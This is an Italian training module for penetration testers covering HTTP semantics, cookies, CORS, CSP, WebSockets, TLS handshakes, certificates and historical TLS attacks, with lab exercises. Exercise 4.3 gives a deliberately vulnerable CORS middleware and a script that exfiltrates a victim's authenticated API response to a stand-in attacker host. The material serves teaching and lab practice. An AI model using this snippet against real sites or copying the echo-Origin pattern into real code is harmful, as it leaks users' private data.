---
title: "HTTP, HTTPS e TLS in profondità"
area: "Networking"
order: 4
level: "intermedio"
summary: "HTTP/1.1, HTTP/2, HTTP/3, semantica, cookie, CORS, CSP, HSTS, WebSockets. TLS handshake, ciphersuite, certificati X.509, PKI, attacchi storici (POODLE, BEAST, FREAK, Heartbleed)."
prereq:
  - "Sezione 03"
tools:
  - "curl, httpie"
  - "Burp Suite Community / mitmproxy"
  - "openssl"
  - "Wireshark"
---

# HTTP, HTTPS e TLS in profondità

> Il 70% delle vulnerabilità che troverai in pentest sono web. Conoscere HTTP a livello di RFC (e non solo "uso fetch in JS") è una delle differenze tra junior e senior.

## HTTP — il protocollo

HTTP è un protocollo testuale a richiesta/risposta. Una richiesta:

```http
GET /api/users?id=42 HTTP/1.1
Host: example.com
User-Agent: curl/8.0
Accept: application/json
Cookie: session=abc123
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

(body se POST/PUT/PATCH)
```

Una risposta:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 27
Set-Cookie: session=xyz; HttpOnly; Secure; SameSite=Lax
Cache-Control: no-store

{"id":42,"name":"Alice"}
```

### Metodi
- **GET**: leggere, idempotente, no body convenzionalmente.
- **HEAD**: come GET ma solo headers (utile per check).
- **POST**: creare risorse, generico "fai qualcosa".
- **PUT**: sostituire risorsa.
- **PATCH**: modifica parziale.
- **DELETE**: eliminare.
- **OPTIONS**: cosa supporto (usato in CORS preflight).
- **CONNECT**: tunnel attraverso proxy.
- **TRACE**: echo della request (rischio XST, di solito disabilitato).

In security, GET e POST sono i più sfruttati. PUT/DELETE abilitati senza auth = grave (sì, succede).

### Status codes
- **1xx informational** (raro).
- **2xx success**: 200 OK, 201 Created, 204 No Content.
- **3xx redirect**: 301 permanent, 302 found, 303 see other, 307/308 (preservano method).
- **4xx client error**: 400, 401 (auth), 403 (forbidden), 404, 405, 409, 422, 429 (rate limit).
- **5xx server error**: 500, 502 (bad gateway), 503 (unavailable), 504 (timeout).

Per testing: la differenza tra 401 e 403 è importante; 401 = "non sei autenticato", 403 = "sei autenticato ma non autorizzato". Spesso confusi.

### Headers importanti per security

| Header (request) | Cosa fa |
|---|---|
| `Host` | virtual host target |
| `User-Agent` | identificativo client (spoofable) |
| `Cookie` | sessione |
| `Authorization` | credenziali (Basic, Bearer, Digest) |
| `Origin` | origine della richiesta (CORS) |
| `Referer` | URL di provenienza (spesso usato per "anti-CSRF" debole) |
| `Content-Type` | tipo body |
| `X-Forwarded-For` | IP originale (se dietro proxy; spoofable se non sanitizzato) |
| `Accept-Language` | utile per blind injection/timing in alcuni casi |
| `Range` | partial content (Heartbleed style attack vector storicamente) |

| Header (response) | Cosa fa |
|---|---|
| `Set-Cookie` | imposta cookie |
| `Cache-Control`, `Pragma`, `Expires` | caching |
| `Content-Security-Policy` (CSP) | restringe origini di script/style/etc. |
| `Strict-Transport-Security` (HSTS) | forza HTTPS futuro |
| `X-Frame-Options` / `Content-Security-Policy: frame-ancestors` | anti-clickjacking |
| `X-Content-Type-Options: nosniff` | impedisce MIME sniffing |
| `Referrer-Policy` | controlla `Referer` mandato |
| `Permissions-Policy` | controlla API browser (camera, mic, ...) |
| `Cross-Origin-Resource-Policy` (CORP), `Cross-Origin-Opener-Policy` (COOP), `Cross-Origin-Embedder-Policy` (COEP) | isolamento process (Spectre) |

Mnemonica per pentest "Security Headers": CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Controlla sempre.

## Cookie — i pasticci da conoscere

Un cookie può avere attributi:

```http
Set-Cookie: session=abc; Domain=example.com; Path=/; Expires=...; Max-Age=3600;
           HttpOnly; Secure; SameSite=Lax
```

- **HttpOnly**: il cookie non è accessibile da JS (mitiga XSS rubacookie).
- **Secure**: invialo solo su HTTPS.
- **SameSite**:
  - `Strict`: mai inviato in richieste cross-site → CSRF molto difficile.
  - `Lax` (default moderno): inviato in navigazione cross-site (link cliccato) ma non in POST cross-site / fetch.
  - `None`: sempre inviato (richiede `Secure`).
- **Domain/Path**: scope. Senza `Domain` = solo host esatto. Con `Domain=example.com` vale anche per `sub.example.com`.
- **Prefix `__Host-`**: forza Secure, no Domain, Path=/ → cookie host-locked.
- **Prefix `__Secure-`**: forza Secure.

Senza HttpOnly+Secure+SameSite la sessione è regalata via XSS / CSRF / MITM su connessioni HTTP residuali.

## CORS — Same-Origin Policy e cross-origin

**Same-Origin Policy** (SOP): un browser non permette a JS di `https://a.com` di leggere risposte da `https://b.com`. È la base della sicurezza web.

Due origini sono **same-origin** se hanno **schema + host + porta** uguali. `https://a.com` ≠ `http://a.com` ≠ `https://a.com:8080`.

**CORS** è il meccanismo per *rilassare* la SOP in modo controllato. Il server include header:

```http
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
```

**Preflight**: per richieste "non semplici" (es. metodo PUT, content-type JSON con `application/json`, header custom), il browser manda prima `OPTIONS` per chiedere il permesso.

```mermaid
sequenceDiagram
    autonumber
    participant JS as JS su https://a.com
    participant BR as Browser
    participant SRV as https://api.b.com
    JS->>BR: fetch('https://api.b.com/x', { method:'PUT' })
    BR->>SRV: OPTIONS /x<br/>Origin: https://a.com<br/>Access-Control-Request-Method: PUT
    SRV->>BR: 204<br/>Access-Control-Allow-Origin: https://a.com<br/>Access-Control-Allow-Methods: PUT
    BR->>SRV: PUT /x (effettiva)
    SRV->>BR: 200 + body
    BR->>JS: response
    Note over BR: Se preflight nega → JS non vede mai<br/>la response (CORS error)
```

**Misconfigurazioni tipiche** (pentest preferito):
- `Access-Control-Allow-Origin: *` con `Allow-Credentials: true` → invalido per spec, alcuni browser permettono comunque.
- Echo `Origin` senza validazione → l'attaccante usa `Origin: https://attacker.com` e il server replica → game over.
- Subdomain takeover di `*.example.com` quando il CORS si fida di subdomain → attacker controlla `evil.example.com` → bypass.

## CSP — Content Security Policy

Definisce quali risorse può caricare la pagina. Mitigazione contro XSS.

```http
Content-Security-Policy: default-src 'self'; 
   script-src 'self' https://cdn.example.com 'nonce-abc123'; 
   style-src 'self' 'unsafe-inline'; 
   img-src 'self' data:; 
   connect-src 'self'; 
   frame-ancestors 'none'; 
   base-uri 'self'; 
   object-src 'none'; 
   report-uri /csp-report
```

In pentest spesso si trova:
- `unsafe-inline` e `unsafe-eval` (bypassano gran parte di CSP).
- Mancanza di `nonce`/`hash`.
- Whitelist con domini permissivi (`*.cloudflare.com`, JSONP endpoints).

## HTTP/2 e HTTP/3

- **HTTP/1.1**: testuale, una richiesta per volta per connessione (pipelining quasi mai usato in pratica).
- **HTTP/2**: binario, multiplexing su singola connessione TCP+TLS (stream paralleli), header compression (HPACK), server push (poco usato).
- **HTTP/3**: HTTP su QUIC (UDP). Niente head-of-line blocking di TCP, 0-RTT (con rischi replay).

In security HTTP/2 ha introdotto attacchi nuovi: **HTTP/2 request smuggling**, downgrade attacks fronted da CDN HTTP/1.1, **HPACK bomb** (memory expansion).

### Request smuggling
Quando un proxy frontend e un backend interpretano i confini delle richieste in modo diverso (es. `Content-Length` vs `Transfer-Encoding: chunked`, o frame H2 → request H1). L'attaccante "nasconde" una richiesta dentro un'altra → bypass auth, cache poisoning, account takeover. Riferimento: lavori di James Kettle (PortSwigger).

## WebSockets

Upgrade da HTTP a connessione bidirezionale full-duplex.

```http
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Da qui in poi, frame binari/testuali bidirezionali. **Security issues:**
- **Cross-Site WebSocket Hijacking:** mancanza di check `Origin` lato server → attaccante apre WS dalla sua pagina con cookie della vittima.
- Mancanza di rate limit / auth on message level.
- Vulnerabilità tipiche del protocollo applicativo che ci viaggia sopra.

## TLS — la riga di vita di HTTPS

TLS (Transport Layer Security) fornisce: **confidenzialità** (cifratura), **integrità** (MAC), **autenticità** (certificati). SSL è il nome legacy (SSLv2/v3 morti, TLS 1.0/1.1 obsoleti, TLS 1.2 e 1.3 attuali).

### TLS 1.2 handshake (semplificato)

```mermaid
sequenceDiagram
    autonumber
    participant C as Client
    participant S as Server
    C->>S: ClientHello<br/>(versione, cipher list, random, SNI)
    S->>C: ServerHello<br/>(cipher scelto, random)
    S->>C: Certificate (catena X.509)
    S->>C: ServerKeyExchange (parametri ECDHE)
    S->>C: ServerHelloDone
    C->>S: ClientKeyExchange (chiave pubblica ECDHE)
    C->>S: ChangeCipherSpec
    C->>S: Finished (cifrato)
    S->>C: ChangeCipherSpec
    S->>C: Finished (cifrato)
    Note over C,S: APPLICATION DATA cifrato (AES-GCM / ChaCha20-Poly1305)
```

Da entrambe le parti, dai random e dall'ECDHE shared secret si derivano chiavi simmetriche. Da qui in poi, dati cifrati con AES-GCM (o ChaCha20-Poly1305).

### Come da "shared secret" si arriva a "chiavi cifratura" (la parte non spiegata di solito)

ECDHE ha prodotto un `pre_master_secret` (es. 32 byte) condiviso. Da lì:

```text
master_secret  = PRF(pre_master_secret, "master secret", client_random + server_random)
key_block      = PRF(master_secret, "key expansion", server_random + client_random)
```

`PRF` è una pseudo-random function (in TLS 1.2: HMAC-SHA256 in modalità extract-and-expand simile a HKDF). Dal `key_block` si tagliano 4 chiavi:

- `client_write_MAC_key` (in mode CBC) / o niente in GCM dove auth è nel cipher.
- `server_write_MAC_key`.
- `client_write_key` (chiave AES per client→server).
- `server_write_key` (chiave AES per server→client).
- `client_write_IV` e `server_write_IV` (per i modi che li richiedono).

**Implicazioni di sicurezza:**
- Senza `pre_master_secret` (e quindi senza chiave privata server / chiave ECDHE eph.) lo sniffer non ricava nulla.
- **Forward secrecy**: con ECDHE, anche se la chiave privata RSA del server viene rubata in futuro, le sessioni passate restano sicure (le chiavi eph. sono state distrutte dopo l'handshake).
- In TLS 1.2 con `RSA key exchange` (deprecato): il client cifra `pre_master_secret` con la chiave pubblica del server e lo manda. **Niente forward secrecy** — chiunque cattura il traffico e ottiene la chiave privata server più tardi può decifrare tutto retroattivamente. Questo è il modo "rotto" che TLS 1.3 ha eliminato.

### Differenza chiave: TLS 1.2 vs TLS 1.3 (in 6 punti)

| Aspetto | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Round trip | 2-RTT | 1-RTT (0-RTT con PSK) |
| Key exchange | RSA, DHE, ECDHE | solo (EC)DHE (forward secrecy obbligatoria) |
| Cipher suite name | `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` (KEX+auth+cipher+PRF) | `TLS_AES_128_GCM_SHA256` (solo cipher+hash; KEX/auth in extension) |
| MAC | HMAC (in CBC+HMAC) o GMAC (in GCM) | sempre AEAD (GCM/Poly1305) |
| Algoritmi simmetrici | tanti (incl. deboli) | 5 AEAD-only |
| Compressione | sì (vulnerabile a CRIME) | rimossa |

### TLS 1.3 handshake (più snello)

- 1-RTT di default (era 2 in TLS 1.2).
- **Rimossi:** RSA key exchange (no forward secrecy), CBC ciphers, SHA-1, compressione, renegotiation.
- **PSK + 0-RTT** opzionale (con limiti per evitare replay).
- AEAD only: AES-GCM, AES-CCM, ChaCha20-Poly1305.

### Cipher suites

In TLS 1.2: `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
- `ECDHE`: key exchange (forward secrecy).
- `RSA`: autenticazione (firma del certificato).
- `AES_128_GCM`: cipher simmetrico autenticato.
- `SHA256`: hash per PRF.

In TLS 1.3: `TLS_AES_128_GCM_SHA256` (auth e KEX negoziati separatamente).

**Cipher da disabilitare:** tutto ciò con `RC4`, `3DES`, `EXPORT`, `NULL`, `MD5`, `anon`, `CBC` (in TLS 1.2 in alcuni contesti).

### Certificati X.509

Un certificato lega una chiave pubblica a un'identità (host, organizzazione) ed è firmato da una CA.

```bash
openssl s_client -connect example.com:443 -servername example.com -showcerts
openssl x509 -in cert.pem -text -noout
```

Campi:
- **Subject**: a chi appartiene (CN, O, OU, C…).
- **Issuer**: chi ha firmato (la CA).
- **Validity**: validità.
- **Subject Public Key**: la chiave pubblica.
- **Extensions**:
  - **Subject Alternative Names (SAN)**: lista host coperti.
  - **Key Usage / Extended Key Usage**: cosa può fare (server auth, client auth, code signing).
  - **CRL Distribution Points / OCSP**: revoche.
  - **Authority Info Access**: dove prendere certificato della CA.
- **Signature** della CA.

**Validazione lato client:**
1. Hostname corrisponde a CN/SAN.
2. Catena completa fino a una CA root di fiducia (trust store).
3. Validità temporale.
4. Non revocato (CRL / OCSP / OCSP stapling).
5. Algoritmi accettabili.

Errori che producono "certificate invalid":
- self-signed o catena incompleta → trust failure.
- CN/SAN mismatch.
- Scaduto.
- Algoritmo deprecato (SHA-1 sign).
- Cert per host wildcard non corretto.

### PKI in azienda — internal CA

Spesso le aziende emettono certificati da una **CA interna** per servizi intranet o intercettazione TLS (proxy enterprise). Il certificato della CA interna è installato nei trust store dei laptop aziendali → permette al proxy di decrittare TLS in transit.

In offensive: durante un pentest interno, importare la CA del Burp/mitmproxy nel browser permette di vedere il traffico HTTPS senza errori.

### Attacchi storici (impara a memoria nomi e idee)

| Anno | Attacco | Cosa colpisce | Idea |
|---|---|---|---|
| 2009 | **Renegotiation** | TLS 1.0/1.1 | Iniettare dati prima della rinegoziazione |
| 2011 | **BEAST** | TLS 1.0 CBC | Prevedibilità IV |
| 2012 | **CRIME** | Compressione TLS | Leak cookie via compress |
| 2013 | **BREACH** | Compressione HTTP | Come CRIME ma su HTTP |
| 2014 | **Heartbleed** | OpenSSL extension heartbeat | OOB read → leak chiavi |
| 2014 | **POODLE** | SSLv3 padding oracle | Decrypt byte-per-byte |
| 2015 | **FREAK** | Export-grade RSA | Downgrade |
| 2015 | **Logjam** | DH primes deboli | Downgrade DH |
| 2016 | **DROWN** | SSLv2 cross-protocol | Decrypt TLS via vecchio SSLv2 |
| 2016 | **Sweet32** | 64-bit block ciphers | Compromettere DES/3DES |
| 2018 | **ROBOT** | RSA key exchange | Bleichenbacher padding oracle storico, ancora vivo |

Tutti questi sono mitigati su sistemi aggiornati con TLS 1.2+/1.3 ben configurato.

**Test config TLS:** [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/), `testssl.sh`.

```bash
testssl.sh https://example.com
nmap --script ssl-enum-ciphers -p 443 example.com
```

## HSTS e Certificate Transparency

- **HSTS**: header `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`. Dice al browser "per un anno usa solo HTTPS, niente downgrade". Con `preload` finisci nelle liste hardcoded di Chrome/Firefox → resistente a primo-uso.
- **Certificate Transparency**: ogni cert pubblico deve essere loggato in CT log pubblici. Strumento difensivo: monitorare l'emissione di cert per i tuoi domini → individui rogue CA. Tool: [crt.sh](https://crt.sh).

## Esercizi

### Esercizio 4.1 — Parli HTTP a mano?

```bash
exec 3<>/dev/tcp/example.com/80
printf 'GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' >&3
cat <&3
```

Lancia. Analizza la risposta. Identifica status, headers, eventuali redirect.

### Esercizio 4.2 — Analisi TLS di un sito reale
Scegli un sito (es. `github.com`).

```bash
openssl s_client -connect github.com:443 -servername github.com -tls1_3 < /dev/null
nmap --script ssl-enum-ciphers,ssl-cert,ssl-known-key -p 443 github.com
testssl.sh --severity HIGH https://github.com
```

Rispondi:
1. Quale CA firma il cert? Validità?
2. Quanti SAN sono inclusi?
3. Quali cipher suite TLS 1.3 supporta?
4. HSTS? Quale max-age?
5. C'è un grado SSL Labs A+? Cosa lo abbasserebbe?

### Esercizio 4.3 — CORS misconfig
In lab: setup un piccolo server Express che restituisce `Access-Control-Allow-Origin: <Origin echo>` e `Allow-Credentials: true`. Scrivi una pagina su un altro origin che fetcha l'API e dimostra il leak.

<details><summary>Snippet server vulnerabile</summary>

```js
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // ECHO
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

```html
<script>
fetch('https://victim.example/api/me', { credentials: 'include' })
  .then(r => r.text()).then(t => fetch('https://attacker/log?d=' + encodeURIComponent(t)));
</script>
```

Mitigazione: whitelist statica di origin, non echo.

</details>

### Esercizio 4.4 — Cookie hardening
Analizza i cookie del tuo sito preferito (DevTools → Application → Cookies). Per ognuno: HttpOnly? Secure? SameSite?

Quali rischi se mancano? Quali categorie di cookie possono *non* avere HttpOnly (es. anti-CSRF token leggibile da JS)?

### Esercizio 4.5 — HTTP Request Smuggling (concettuale)
Leggi il classico paper di James Kettle ["HTTP Desync Attacks: Request Smuggling Reborn"](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). Spiega in 5 frasi la differenza CL.TE vs TE.CL.

### Esercizio 4.6 — Lab PortSwigger
Vai alla [PortSwigger Web Security Academy](https://portswigger.net/web-security). Completa il modulo gratuito "**CORS**" (4 lab) e "**HTTP Host header attacks**" (7 lab). Sono guidati e GRATIS.

### Esercizio 4.7 — Estensione: HSTS bypass
Spiega perché HSTS protegge meno gli utenti che visitano un dominio per la prima volta (TOFU — Trust On First Use). Cosa risolve preload list?

### Esercizio 4.8 — WebSocket hijacking concettuale
Disegna lo scenario: vittima loggata su `chat.example.com`, attaccante ospita pagina che apre `WebSocket('wss://chat.example.com/...')`. Cosa serve lato server per impedirlo?

<details><summary>Risposta</summary>

Validare l'header `Origin` lato server al momento dell'upgrade WS (oppure usare token CSRF nel sotto-protocollo).

</details>

## Concetti chiave

1. **HTTP è testuale, semplice da leggere e quindi da abusare.**
2. **Cookie con attributi giusti (HttpOnly, Secure, SameSite) eliminano molte categorie di attacchi.**
3. **CORS non è "una difesa" ma una *rilassamento controllato* di SOP; misconfig = exfil.**
4. **CSP è la prima linea contro XSS — ma `unsafe-inline` la rompe.**
5. **HTTP/2/3 e gateway misti aprono superfici nuove (smuggling).**
6. **TLS protegge dai man-in-the-middle senza chiavi; chi ha endpoint o trust store ha tutto.**
7. **HSTS + CT log + PKI internal: ecosistema, non singolo header.**

Adesso siamo pronti per la crittografia "vera".
